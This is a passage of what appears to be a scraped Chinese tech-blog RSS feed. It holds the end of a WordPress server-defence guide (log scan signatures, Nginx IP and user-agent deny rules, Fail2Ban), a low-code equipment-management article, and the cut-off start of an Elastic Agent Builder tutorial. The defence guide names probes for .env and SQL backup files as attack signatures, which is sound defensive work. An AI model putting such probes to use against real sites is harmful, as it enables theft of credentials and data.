<p><strong>日志特征</strong>： 脚本发现某个 IP 的 ​<code>​path​</code>​ 全是 ​<code>​/wp-login.php​</code>​, ​<code>​.env​</code>​, ​<code>​sql.bak​</code>​ 等。 <strong>分析</strong>：这是在扫描bug，试图爆破后台。 <strong>对策</strong>：<strong>立刻封杀，并安装 Fail2Ban 自动处理。</strong></p>
<hr/>
<h3 data-id="heading-7">🛡️ 第四步：实施封锁</h3>
<p>Python 帮我们找出了敌人，现在要在服务器层面进行拦截。</p>
<h4 data-id="heading-8">1. 基于 IP 的封禁 (Nginx)</h4>
<p>Python 脚本已经生成了 ​<code>​nginx_deny_list.conf​</code>​，内容大致如下：</p>
<pre><code class="hljs language-ini" lang="ini">deny 45.132.11.22<span class="hljs-comment">;</span>
deny 103.21.33.44<span class="hljs-comment">;</span>
</code></pre>
<p><strong>部署方法：</strong></p>
<ol>
<li>将该文件上传到 Nginx 配置目录（如 ​<code>​/etc/nginx/conf.d/​</code>​）。</li>
<li>在你的网站配置文件（​<code>​server​</code>​ 块内）引入它：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">server {
    listen 80<span class="hljs-comment">;</span>
    server_name example.com<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 引入封禁列表</span>
    include /etc/nginx/conf.d/nginx_deny_list.conf<span class="hljs-comment">;</span>
    
    location / {
        ...
    }
}
</code></pre>
<ol>
<li>重载 Nginx：​<code>​sudo nginx -s reload​</code>​。 <em>效果：这些 IP 访问时直接返回 403 Forbidden，甚至不消耗 PHP 资源。</em></li>
</ol>
<h4 data-id="heading-9">2. 基于 User-Agent 的封禁 (Nginx)</h4>
<p>针对那些换 IP 很勤快，但 UA 固定的爬虫（如 MJ12bot, AhrefsBot），直接在 Nginx 配置文件中添加判断：</p>
<pre><code class="hljs language-bash" lang="bash">server {
    <span class="hljs-comment"># ... 其他配置</span>
    
    <span class="hljs-comment"># 禁止特定的 User-Agent</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_user_agent</span> ~* (MJ12bot|AhrefsBot|SemrushBot|DotBot|PetalBot|Bytespider)) {
        <span class="hljs-built_in">return</span> 403;
    }
}
</code></pre>
<p><em>注意：</em> ​<code>​Bytespider​</code>​<em>​ 是字节跳动的爬虫，非常凶猛，如果是中文站且不需要今日头条的流量，建议限制或封禁。</em></p>
<hr/>
<h3 data-id="heading-10">🚀 进阶技巧：自动化防御 (Fail2Ban)</h3>
<p>虽然 Python 脚本分析很有用，但手动跑太累。对于 WordPress，建议结合 <strong>Fail2Ban</strong> 实现自动化。</p>
<p>虽然 Fail2Ban 不是 Python 写的（虽然它现在也有 Python 绑定），但它的逻辑和我们上面的脚本一样：<strong>读日志 -&gt; 正则匹配 -&gt; 调用防火墙(iptables)封IP</strong>。</p>
<p><strong>简单的 WordPress 防爆破配置思路：</strong></p>
<ol>
<li>安装 Fail2Ban。</li>
<li>配置 Jail 监控 ​<code>​/var/log/auth.log​</code>​ 或 Nginx 日志。</li>
<li>规则：如果在 5 分钟内访问 ​<code>​wp-login.php​</code>​ 返回非 200 状态码超过 5 次，封禁 IP 1小时。</li>
</ol>
<hr/>
<h3 data-id="heading-11">对于资源紧张的 WordPress 博客：</h3>
<ol>
<li><strong>定期分析</strong>：使用提供的 Python 脚本定期（如每周）“体检”，看看到底是谁在消耗你的 CPU。</li>
<li><strong>狠心做减法</strong>：对于不带来直接流量的国外 SEO 爬虫（Ahrefs, MJ12等），建议直接在 Nginx 层屏蔽 User-Agent。</li>
<li><strong>精确打击</strong>：对于异常高频的单个 IP，利用 Python 生成的黑名单直接 Deny。</li>
</ol>
<p>通过这套组合拳，你会发现服务器负载会瞬间下降，博客又能秒开了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[低代码高价值场景：让设备管理真正成为企业数字化资产]]></title>    <link>https://juejin.cn/post/7576175307351425039</link>    <guid>https://juejin.cn/post/7576175307351425039</guid>    <pubDate>2025-11-24T06:59:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307351425039" data-draft-id="7575457788665249844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="低代码高价值场景：让设备管理真正成为企业数字化资产"/> <meta itemprop="keywords" content="低代码"/> <meta itemprop="datePublished" content="2025-11-24T06:59:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="得帆云低代码"/> <meta itemprop="url" content="https://juejin.cn/user/2254449849150557"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            低代码高价值场景：让设备管理真正成为企业数字化资产
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2254449849150557/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    得帆云低代码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:59:30.000Z" title="Mon Nov 24 2025 06:59:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文作者：得帆信息联合创始人&amp;CIO刘鑫</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acc9bf79a8984fffbd30ddfc8a68b4d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=iV7ILyq4FRePGp1CofV3ODA%2BilY%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-0"><strong>制造业设备管理的痛点</strong></h3>
<p>在制造业的生产现场，设备是产能的根基。无论是冲压机、注塑机还是检测设备，一旦停机，生产节拍就被打乱，交付计划可能瞬间失控。设备的稳定运行不仅关乎生产效率，更直接影响到客户对“工厂管理水平”的评估。</p>
<p>然而，现实中许多制造企业的设备管理仍停留在“半人工化”的阶段：设备台账、保养计划、点检记录分散在各个Excel表格和纸质检查单上。时间一久，信息碎片化、追溯困难的问题开始显现。设备何时保养？上次故障原因？是否按周期点检？这些问题往往需要翻找文件夹、逐页查找才能得到答案。</p>
<p>更棘手的是，当下游客户前来验厂时，审核人员往往要求在短时间内提供设备档案、点检记录和维修历史，但现场人员却需要花费数小时才能拼凑出完整资料。看似只是信息管理问题，实则是影响客户信任度和供应链竞争力的关键环节。</p>
<p>这也让越来越多制造企业开始思考——如何用系统化的手段替代手工Excel，让设备管理真正成为企业的数字化资产。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1354cefb58e24544a50cd87a412ec166~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=Q%2FOlA5rzhnYB0QzFUk5HV1Ig%2FcA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1"><strong>为什么选择低代码模式来构建设备管理？</strong></h3>
<p>不少企业最初尝试通过OA或MES等工具来实现设备管理，比如用表单模块做设备台账，用流程引擎审批保养计划。虽然短期内可以上线，但很快问题暴露出来：移动端体验不佳、一线操作繁琐，业务规则难以灵活配置，流程稍复杂就变得僵硬低效。最终，这类“临时方案”往往难以支撑企业持续改进设备管理的目标。</p>
<p>事实上，设备管理的数字化，本质上是一个从纸质到线上、从管理到运营的渐进式变革过程。一线操作人员需要时间去适应数字化工具，如果系统一开始就过于复杂，反而会造成抵触情绪，降低使用意愿。这就要求系统具备“可生长性”，能从基础台账管理逐步扩展到巡检、保养、维修、能耗分析等更精细的环节。</p>
<p>低代码平台正好契合了这一需求。它既能在初期快速搭建出简洁、易用的应用原型，降低一线用户的学习门槛；又能随着企业管理成熟度的提升，通过灵活配置规则、表单、流程，逐步完善业务深度。相比传统定制开发，低代码的最大价值不在“便宜”或“快”，而在于让企业的系统建设与管理能力同步成长。</p>
<p>正因如此，如今越来越多制造企业，尤其是以设备为核心资产的生产型工厂，选择用低代码平台构建自己的设备管理系统，让数字化真正服务于现场管理，而非成为新的负担。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fd1db1696ce4915ba60feb957649e5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=%2FWZ49%2FpOy9OqxOZACfcSdgMGkLE%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>低代码实现设备管理进阶管理</strong></h2>
<p>在落地层面，很多企业在推进设备管理系统时都会发现，不同阶段的管理需求差异巨大，一套系统难以“一步到位”。因此，建设路径往往需要从基础到深入、从局部到全面，循序渐进地展开。</p>
<p>从管控深度上看，设备管理通常经历三个阶段：</p>
<ul>
<li>阶段一：资产台账管理，以设备台账为核心，先把“家底”摸清楚，实现设备信息、状态、位置、责任人等基础数据的统一管理；</li>
<li>阶段二：全生命周期流程管理，将点检、保养、维修、备件等关键流程线上化、标准化，让设备管理从“被动记录”走向“主动预防”；</li>
<li>阶段三：实时物联管理，通过传感器和IoT接入，实现设备运行数据的实时采集与预警分析，帮助管理者从数据中洞察风险与优化空间。</li>
</ul>
<p>而从管理范围上看，企业往往不仅仅管理“设备”本身，还会延伸至模具、治具、工装等关键生产资源。不同资产类型虽在管理逻辑上各有差异，但背后共通的目标是一致的，让现场管理更加透明、可追溯、可优化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f6db0fe5920454199b497f4c4e1c28f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=SLCyNIbKvYOTo%2BnVd9QrBL%2B1cL0%3D" alt="图片" loading="lazy"/></p>
<p>在得帆低代码的客户实践中，设备管理已成为最具代表性、也是最常被落地的业务场景之一。相比CRM、SRM等传统管理系统，设备管理的项目覆盖率更高，综合排名稳居第一。原因在于：它既贴近生产现场，又能直接体现数字化的管理成效。</p>
<p>通过对多个客户项目的优秀实践分析，我们总结出一套适用于多数制造企业的典型管控范围与颗粒度建议，帮助企业在推进数字化设备管理时，更有章法地规划建设路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abca90c5d5e248538c9b3255a62db522~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=I8hv1VpxgT8J0qn2TE8BMbrVc%2BY%3D" alt="图片" loading="lazy"/></p>
<p><strong>01</strong>关键方案1：设备/模具资源履历全程可查</p>
<p>通过资源编号可以在低代码系统内查询整个设备生命周期的全部履历档案，档案包括：</p>
<ul>
<li>新模具工装等申购申请；</li>
<li>新模具工装等检测验收；</li>
<li>模具工装入模具库房；</li>
<li>模具工装借出申请；</li>
<li>模具工装实际借出确认；</li>
<li>模具工装上生产线使用前进行扫描；</li>
<li>模具工装生产使用完的归还申请；</li>
<li>模具工装生产使用完的归还前的检测验收；</li>
<li>模具工装生产使用完，检验合格后的入模具库房；</li>
<li>模具使用寿命管理，保养&amp;维修&amp;报废验收。</li>
<li><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cefad3b121b42c2b99dcf6bbea1594c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=z9ailmDo%2BqDtCewsN1fw8JyGj3w%3D" alt="图片" loading="lazy"/></li>
</ul>
<p>02<strong>关键方案2：设备/模具线上管理和追溯维修保养记录</strong></p>
<p>可以通过资源编号或资源类别在IT系统中体现维护、保养、点检的周期要求、自动显示维护、保养、点检checklist，检验项目和检验方法。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99cc7dcf59fa413e8785e1400892a5a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=ZiroqlM8VLpPnpM3ScNapTh41fc%3D" alt="图片" loading="lazy"/></p>
<p>03<strong>关键场景3：异常情况在线实时数据分析</strong></p>
<p>可视化图表展示设备异常情况和发生频率，直观分析异常发生的根本原因。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca0885a55b984855964664b881f0b560~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=oZo5RPLvFO9Bq97NGGpNhXTABqg%3D" alt="图片" loading="lazy"/></p>
<p>设备管理数字化的价值，首先在于摆脱纸质化与人工低效，实现台账、保养、维修等全过程线上化，提升数据准确性与执行效率；同时，显著增强企业竞争力，在下游客户验厂中展现规范透明的管理能力，助力获得更高评级；部分标杆客户更通过数采融合，实现设备运行监控与预测性维护，让管理从“记录问题”升级为“预防问题”，真正让设备成为可运营的数字资产。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elastic AI agent builder 介绍（四）]]></title>    <link>https://juejin.cn/post/7575937594351239211</link>    <guid>https://juejin.cn/post/7575937594351239211</guid>    <pubDate>2025-11-24T06:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351239211" data-draft-id="7575751471843000356" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elastic AI agent builder 介绍（四）"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-11-24T06:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elastic AI agent builder 介绍（四）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:31:14.000Z" title="Mon Nov 24 2025 06:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41a587aa09344a0ca46d717464d60fc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=3abxUebVCa7HOCchM5UouFyGuBs%3D" alt="" loading="lazy"/></p>
<p>在我之前的文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513" title="https://elasticstack.blog.csdn.net/article/details/152212513" target="_blank" ref="nofollow noopener noreferrer">Elastic AI agent builder 介绍（一）</a>”，我详细地介绍了如何在 Kibana 中创建 tools 及 agents。在今天的文章里，我讲详细地介绍如何在 Python 应用里访问这些 agents。我们可以参考文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F155162911" title="https://elasticstack.blog.csdn.net/article/details/155162911" target="_blank" ref="nofollow noopener noreferrer">开始使用 Elastic Agent Builder 和 Microsoft Agent Framework</a>”。</p>
<h2 data-id="heading-0">安装</h2>
<p>我们首先参考文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513" title="https://elasticstack.blog.csdn.net/article/details/152212513" target="_blank" ref="nofollow noopener noreferrer">Elastic AI agent builder 介绍（一）</a>” 来进行安装。我们也需要按照这个<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513%23t16" title="https://elasticstack.blog.csdn.net/article/details/152212513#t16" target="_blank" ref="nofollow noopener noreferrer">章节</a>来创建一个叫做 find_the_cheapest_ticket_from_cn_us 的 agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae97adf21b174613b3374b27290a991c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=OBr4ulkNMLqytj141KZgpG4mni8%3D" alt="" loading="lazy"/></p>
<p>我们可以在 Agents 界面中进行如上的查询。</p>
<h2 data-id="heading-1">下载代码</h2>
<p>接下来，我们下载已经创建好的代码：</p>
<pre><code class="hljs language-bash" lang="bash">`git <span class="hljs-built_in">clone</span> https://github.com/liu-xiao-guo/ai_agent_builder`AI写代码
</code></pre>
<p>然后我们进入到项目的根目录中，并创建一个叫做 .env 的文件：</p>
<p><strong>.env</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

